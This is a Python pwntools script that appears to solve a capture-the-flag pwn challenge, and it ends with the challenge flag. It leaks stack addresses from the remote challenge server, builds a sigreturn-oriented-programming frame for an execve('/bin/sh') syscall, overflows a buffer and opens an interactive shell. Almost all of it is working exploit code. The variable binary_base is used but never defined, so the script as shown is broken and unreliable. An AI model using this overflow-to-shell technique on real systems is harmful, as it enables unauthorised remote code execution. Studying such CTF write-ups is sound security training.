from pwn import *


'''
leak address de la stack 
appeller read avec une chaine de longeur 15 => rax Ã  0xf (15) avec RIP qui pointer vers syscall

https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop/using-srop

'''
context.arch='amd64'

padding= 65


r = remote("challenges1.gcc-ctf.com",4004)
# r= process("chall")
r.sendlineafter(b'>',b'2008')
r.sendlineafter(b'>',b'A'*100)

leaked = r.recvuntil(b"-")[:].strip()


# group by 8 bytes  
all_leaks = [hex(u64(leaked[i:i+8].ljust(8,b'\x00'))) for i in range(0,len(leaked)+1,8)] 
for i in range(len(all_leaks)):
    print(i, all_leaks[i])


BINSH = int(all_leaks[63],16)+16-224

SYSCALL_RET = binary_base + 0x0000000000001034 #syscall ; leave ; ret
frame = SigreturnFrame()
frame.rax = 0x3b            # syscall number for execve
frame.rdi = BINSH           # pointer to /bin/sh
frame.rsi = 0x0             # NULL
frame.rdx = 0x0             # NULL
frame.rip = SYSCALL_RET



print("[*] binary base", hex(binary_base))


payload = b'/bin/sh\x00'*padding
payload+=p64(SYSCALL_RET)
payload+=bytes(frame)
payload+=b'/bin/sh\x00'*200


r.sendlineafter(b'>',b"15")
r.sendlineafter(b'>', payload)
r.interactive()

# GCC{SR0p_1s_f0r_Sup3r_R0P_Right?}


